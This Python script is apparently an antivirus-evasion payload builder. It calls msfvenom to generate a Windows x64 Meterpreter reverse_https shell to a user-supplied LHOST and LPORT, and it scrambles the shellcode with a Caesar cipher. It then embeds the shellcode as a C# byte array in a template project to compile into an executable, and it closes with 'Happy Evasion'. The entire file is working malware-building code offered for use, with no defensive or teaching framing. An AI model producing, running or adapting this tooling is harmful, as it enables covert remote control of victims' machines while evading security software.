import time
import datetime
import subprocess

bold = "\033[1m"
green = "\033[32m"
white = "\033[37m"
purple = "\033[95m"
red = "\033[91m"
blue = "\033[34m"
orange = "\033[33m"
end = "\033[0m"

def print_success(text) :
    print(f"{bold}{green}[+] {end}{text}")
def print_info(text) :
    print(f"{bold}{purple}[*] {end}{text}")
def print_error(text) : 
    print(f"{bold}{red}[-] {end}{text}") 

LHOST = input("LHOST: ")
LPORT = input("LPORT: ")

print_info(f"Using LHOST as {orange}{bold}{LHOST}{end} and LPORT as {bold}{orange}{LPORT}")

# Using msfvenom to generate shellcode for using windows/x64/meterpreter/reverse_https payload and LHOST and LPORT given as input from the user
print_info("Generating msfvenom shellcode...")
subprocess.run(["msfvenom","-p","windows/x64/meterpreter/reverse_https",f"LHOST={LHOST}",f"LPORT={LPORT}","-f","hex","-o","msf_shellcode.hex"], stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
print_success("MSFVenom Shellcode generation successful")

# Reading the hexstring shellcode from the msfvenom file and converting into an integer array
with open("msf_shellcode.hex","r") as msf_hex_shellcode:
	hex_shellcode = msf_hex_shellcode.read()

integer_shellcode = [int(hex_shellcode[i:i+2],16) for i in range(0, len(hex_shellcode), 2)]


# Caeser Cipher Section which also has the caeser cipher key
scrambled_shellcode = []
caeser_key = 7
for each in integer_shellcode:
	scrambled_shellcode.append(hex((each + caeser_key) & 0xff))

print_success(f"Encoded shellcode with caeser cipher with +{caeser_key} as Key")

# Packing the shellcode in the 0xff style array for usage in C#
final_shellcode = ""
for i in range(len(scrambled_shellcode)):
	if i == 0:
		final_shellcode += f"byte[] buf = new byte[{len(scrambled_shellcode)}]" + "{\n"
	final_shellcode += scrambled_shellcode[i]
	if i % 14 == 0 and i != 0:
		final_shellcode += ",\n"
	elif i == 0 or (i % 14 != 0 and i != len(scrambled_shellcode)-1):
		final_shellcode += ","
	if i == len(scrambled_shellcode)-1:
		final_shellcode += " };"

# Removing the shellcode as no one needs it anymore
subprocess.run(["rm","-rf","msf_shellcode.hex"], stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
print_info(f"Deleting the msf_shellcode.hex file as no one wants it anymore")

current_time = datetime.datetime.fromtimestamp(time.time()).strftime("%d%m%Y%I%M%S%p")

# Assembling a c# sln project with encoded shellcode in the output directory
print_info(f"Baking the fresh Shellcode into a C# project for compiling")
csharp_proj_name = f"rev_exe_{current_time}"
subprocess.run(["mkdir" , "output"])
subprocess.run(["cp","-r","templates/rev_exe",f"output/{csharp_proj_name}"], stdout=subprocess.PIPE,stderr=subprocess.STDOUT)

with open(f"output/{csharp_proj_name}/Program.cs","r") as csharp_template_code:
	template_code = csharp_template_code.readlines()

template_code.insert(30,final_shellcode)

with open(f"output/{csharp_proj_name}/Program.cs","w") as final_csharp_code:
	template_code = "".join(template_code)
	final_csharp_code.write(template_code)
print_success(f"Baking successfull please compile the C# Project using {bold}{purple}Microsoft Visual Studio{end} on Windows")
print_success(f"{orange}{bold}Happy Evasion using {csharp_proj_name}!!!{end}")